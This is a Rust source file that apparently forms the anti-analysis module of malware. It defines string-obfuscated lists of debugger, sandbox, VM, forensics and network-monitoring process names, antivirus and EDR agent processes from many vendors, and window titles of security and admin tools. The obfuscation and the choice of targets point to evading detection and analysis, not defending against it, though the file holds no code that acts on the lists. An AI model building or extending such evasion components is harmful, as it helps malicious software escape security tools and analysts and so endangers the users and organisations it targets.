use once_cell::sync::Lazy;
use obfstr::obfstr;

// OBFUSCATED THREAT DETECTION LISTS
pub static HIGH_THREAT_ANALYSIS_TOOLS: Lazy<Vec<String>> = Lazy::new(|| vec![
    // Debuggers and Disassemblers
    obfstr!("ida.exe").to_string(),
    obfstr!("ida64.exe").to_string(), 
    obfstr!("idaq.exe").to_string(),
    obfstr!("idaw.exe").to_string(),
    obfstr!("idag.exe").to_string(),
    obfstr!("ida64q.exe").to_string(),
    obfstr!("idau.exe").to_string(),
    obfstr!("idau64.exe").to_string(),
    obfstr!("x32dbg.exe").to_string(),
    obfstr!("x64dbg.exe").to_string(),
    obfstr!("x96dbg.exe").to_string(),
    obfstr!("ollydbg.exe").to_string(),
    obfstr!("windbg.exe").to_string(),
    obfstr!("cdb.exe").to_string(),
    obfstr!("ntsd.exe").to_string(),
    obfstr!("kd.exe").to_string(),
    obfstr!("gdb.exe").to_string(),
    obfstr!("radare2.exe").to_string(),
    obfstr!("r2.exe").to_string(),
    obfstr!("rizin.exe").to_string(),
    obfstr!("rz.exe").to_string(),
    obfstr!("ghidra.exe").to_string(),
    obfstr!("binaryninja.exe").to_string(),
    
    // System Monitors and Analysis Tools
    obfstr!("procmon.exe").to_string(),
    obfstr!("procmon64.exe").to_string(),
    obfstr!("procexp.exe").to_string(),
    obfstr!("procexp64.exe").to_string(),
    obfstr!("autoruns.exe").to_string(),
    obfstr!("autoruns64.exe").to_string(),
    obfstr!("autorunsc.exe").to_string(),
    obfstr!("autorunsc64.exe").to_string(),
    obfstr!("regmon.exe").to_string(),
    obfstr!("regmon64.exe").to_string(),
    obfstr!("filemon.exe").to_string(),
    obfstr!("portmon.exe").to_string(),
    obfstr!("regshot.exe").to_string(),
    obfstr!("regshot-x64-ansi.exe").to_string(),
    obfstr!("apimonitor.exe").to_string(),
    obfstr!("apimonitor-x64.exe").to_string(),
    
    // Network Analysis
    obfstr!("wireshark.exe").to_string(),
    obfstr!("tshark.exe").to_string(),
    obfstr!("dumpcap.exe").to_string(),
    obfstr!("windump.exe").to_string(),
    obfstr!("tcpview.exe").to_string(),
    obfstr!("tcpview64.exe").to_string(),
    obfstr!("netmon.exe").to_string(),
    obfstr!("fiddler.exe").to_string(),
    obfstr!("burpsuite.exe").to_string(),
    obfstr!("burp.exe").to_string(),
    
    // Sandboxes and VMs
    obfstr!("vmsrvc.exe").to_string(),
    obfstr!("vmusrvc.exe").to_string(),
    obfstr!("vmtoolsd.exe").to_string(),
    obfstr!("vmware.exe").to_string(),
    obfstr!("vmware-vmx.exe").to_string(),
    obfstr!("vmware-authd.exe").to_string(),
    obfstr!("virtualbox.exe").to_string(),
    obfstr!("vboxservice.exe").to_string(),
    obfstr!("vboxtray.exe").to_string(),
    obfstr!("qemu.exe").to_string(),
    obfstr!("qemu-system.exe").to_string(),
    obfstr!("qemu-img.exe").to_string(),
    obfstr!("sbiesvc.exe").to_string(),
    obfstr!("raptorservice.exe").to_string(),
    obfstr!("joe-sandbox.exe").to_string(),
    obfstr!("cuckoo.exe").to_string(),
    
    // Forensics Tools
    obfstr!("volatility.exe").to_string(),
    obfstr!("rekall.exe").to_string(),
    obfstr!("autopsy.exe").to_string(),
    obfstr!("sleuthkit.exe").to_string(),
    obfstr!("ftk.exe").to_string(),
    obfstr!("encase.exe").to_string(),
    obfstr!("plaso.exe").to_string(),
    obfstr!("log2timeline.exe").to_string(),
    
    // Hex Editors and Binary Analysis
    obfstr!("hxd.exe").to_string(),
    obfstr!("hex-workshop.exe").to_string(),
    obfstr!("010editor.exe").to_string(),
    obfstr!("hexedit.exe").to_string(),
    obfstr!("bless.exe").to_string(),
    obfstr!("pestudio.exe").to_string(),
    obfstr!("peview.exe").to_string(),
    obfstr!("peid.exe").to_string(),
    obfstr!("exeinfope.exe").to_string(),
    obfstr!("detect-it-easy.exe").to_string(),
    obfstr!("die.exe").to_string(),
]);

pub static COMMON_AV_EDR_PROCESSES: Lazy<Vec<String>> = Lazy::new(|| vec![
    // Windows Defender
    obfstr!("msmpeng.exe").to_string(),
    obfstr!("antimalware service executable").to_string(),
    obfstr!("windefend").to_string(),
    obfstr!("msseces.exe").to_string(),
    obfstr!("mpcmdrun.exe").to_string(),
    obfstr!("mpnotify.exe").to_string(),
    
    // CrowdStrike Falcon
    obfstr!("csfalconservice.exe").to_string(),
    obfstr!("csfalconcontainer.exe").to_string(),
    obfstr!("csagent.exe").to_string(),
    obfstr!("csshell.exe").to_string(),
    
    // SentinelOne
    obfstr!("sentinelagent.exe").to_string(),
    obfstr!("sentinelone.exe").to_string(),
    obfstr!("sentinelctl.exe").to_string(),
    obfstr!("sentinelhostservice.exe").to_string(),
    
    // Carbon Black
    obfstr!("cb.exe").to_string(),
    obfstr!("carbonblack.exe").to_string(),
    obfstr!("cbdefense.exe").to_string(),
    obfstr!("carbonblackk.exe").to_string(),
    obfstr!("cbcomms.exe").to_string(),
    obfstr!("cbstream.exe").to_string(),
    
    // Cylance
    obfstr!("cylancesvc.exe").to_string(),
    obfstr!("cylanceui.exe").to_string(),
    obfstr!("cyoptics.exe").to_string(),
    obfstr!("cyupdate.exe").to_string(),
    
    // Symantec/Broadcom
    obfstr!("ccsvchst.exe").to_string(),
    obfstr!("rtvscan.exe").to_string(),
    obfstr!("sep.exe").to_string(),
    obfstr!("symantec.exe").to_string(),
    obfstr!("smc.exe").to_string(),
    obfstr!("smcgui.exe").to_string(),
    obfstr!("sepwsc.exe").to_string(),
    
    // McAfee
    obfstr!("mcshield.exe").to_string(),
    obfstr!("mcafee.exe").to_string(),
    obfstr!("mfemms.exe").to_string(),
    obfstr!("mfevtp.exe").to_string(),
    obfstr!("mcuicnt.exe").to_string(),
    obfstr!("mctray.exe").to_string(),
    obfstr!("masvc.exe").to_string(),
    
    // Trend Micro
    obfstr!("tmbmsrv.exe").to_string(),
    obfstr!("tmccsf.exe").to_string(),
    obfstr!("tmlisten.exe").to_string(),
    obfstr!("tmproxy.exe").to_string(),
    obfstr!("tmntsrv.exe").to_string(),
    obfstr!("pccnt.exe").to_string(),
    obfstr!("pccpfw.exe").to_string(),
    
    // Kaspersky
    obfstr!("avp.exe").to_string(),
    obfstr!("kavfs.exe").to_string(),
    obfstr!("kavfsslp.exe").to_string(),
    obfstr!("klnagent.exe").to_string(),
    obfstr!("klwtblfs.exe").to_string(),
    obfstr!("ksde.exe").to_string(),
    
    // ESET
    obfstr!("ekrn.exe").to_string(),
    obfstr!("egui.exe").to_string(),
    obfstr!("esetservice.exe").to_string(),
    obfstr!("eamonm.exe").to_string(),
    obfstr!("ecls.exe").to_string(),
    
    // Malwarebytes
    obfstr!("mbam.exe").to_string(),
    obfstr!("mbamservice.exe").to_string(),
    obfstr!("malwarebytes.exe").to_string(),
    obfstr!("mbamtray.exe").to_string(),
    
    // Microsoft Advanced Threat Protection (ATP)
    obfstr!("microsoftwindowsdefenderatp.exe").to_string(),
    obfstr!("mdatp.exe").to_string(),
    obfstr!("wdatp.exe").to_string(),
    obfstr!("microsoftdefenderatp.exe").to_string(),
    
    // Other EDR Solutions
    obfstr!("tanium.exe").to_string(),
    obfstr!("taniumclient.exe").to_string(),
    obfstr!("elastic-agent.exe").to_string(),
    obfstr!("elastic-endpoint.exe").to_string(),
    obfstr!("fireeye.exe").to_string(),
    obfstr!("mandiant.exe").to_string(),
    obfstr!("xagt.exe").to_string(), // FireEye HX Agent
    obfstr!("fe_avs.exe").to_string(),
    obfstr!("fhoster.exe").to_string(),
    obfstr!("lacuna.exe").to_string(),
]);

pub static SUSPICIOUS_WINDOW_TITLES: Lazy<Vec<String>> = Lazy::new(|| vec![
    // Analysis Tools Window Titles
    obfstr!("IDA Pro").to_string(),
    obfstr!("Hex-Rays").to_string(),
    obfstr!("x64dbg").to_string(),
    obfstr!("x32dbg").to_string(),
    obfstr!("OllyDbg").to_string(),
    obfstr!("WinDbg").to_string(),
    obfstr!("Process Monitor").to_string(),
    obfstr!("Process Explorer").to_string(),
    obfstr!("Autoruns").to_string(),
    obfstr!("Registry Monitor").to_string(),
    obfstr!("File Monitor").to_string(),
    obfstr!("API Monitor").to_string(),
    obfstr!("Wireshark").to_string(),
    obfstr!("Burp Suite").to_string(),
    obfstr!("Fiddler").to_string(),
    obfstr!("TCPView").to_string(),
    obfstr!("PE-bear").to_string(),
    obfstr!("PEiD").to_string(),
    obfstr!("PEView").to_string(),
    obfstr!("CFF Explorer").to_string(),
    obfstr!("Resource Hacker").to_string(),
    obfstr!("Dependency Walker").to_string(),
    obfstr!("Ghidra").to_string(),
    obfstr!("Binary Ninja").to_string(),
    obfstr!("Radare2").to_string(),
    obfstr!("HxD").to_string(),
    obfstr!("010 Editor").to_string(),
    
    // Sandbox/VM Window Titles
    obfstr!("VMware").to_string(),
    obfstr!("VirtualBox").to_string(),
    obfstr!("QEMU").to_string(),
    obfstr!("Sandboxie").to_string(),
    obfstr!("Joe Sandbox").to_string(),
    obfstr!("Cuckoo Sandbox").to_string(),
    obfstr!("ANY.RUN").to_string(),
    obfstr!("Hybrid Analysis").to_string(),
    
    // Forensics Tools
    obfstr!("Volatility").to_string(),
    obfstr!("Autopsy").to_string(),
    obfstr!("Sleuth Kit").to_string(),
    obfstr!("FTK Imager").to_string(),
    obfstr!("EnCase").to_string(),
    obfstr!("SANS SIFT").to_string(),
    obfstr!("AXIOM").to_string(),
    
    // Security Software
    obfstr!("CrowdStrike").to_string(),
    obfstr!("Falcon").to_string(),
    obfstr!("SentinelOne").to_string(),
    obfstr!("Carbon Black").to_string(),
    obfstr!("Cylance").to_string(),
    obfstr!("Symantec Endpoint").to_string(),
    obfstr!("McAfee").to_string(),
    obfstr!("Trend Micro").to_string(),
    obfstr!("Kaspersky").to_string(),
    obfstr!("ESET").to_string(),
    obfstr!("Malwarebytes").to_string(),
    obfstr!("Windows Defender").to_string(),
    obfstr!("Microsoft Defender").to_string(),
    
    // Command Prompts and Shells (suspicious if multiple)
    obfstr!("Command Prompt").to_string(),
    obfstr!("PowerShell").to_string(),
    obfstr!("Windows PowerShell").to_string(),
    obfstr!("PowerShell ISE").to_string(),
    obfstr!("Task Manager").to_string(),
    obfstr!("Services").to_string(),
    obfstr!("Registry Editor").to_string(),
    obfstr!("Event Viewer").to_string(),
    
    // Network Tools
    obfstr!("Nmap").to_string(),
    obfstr!("Metasploit").to_string(),
    obfstr!("Cobalt Strike").to_string(),
    obfstr!("Armitage").to_string(),
    obfstr!("Nessus").to_string(),
    obfstr!("OpenVAS").to_string(),
    obfstr!("Rapid7").to_string(),
]);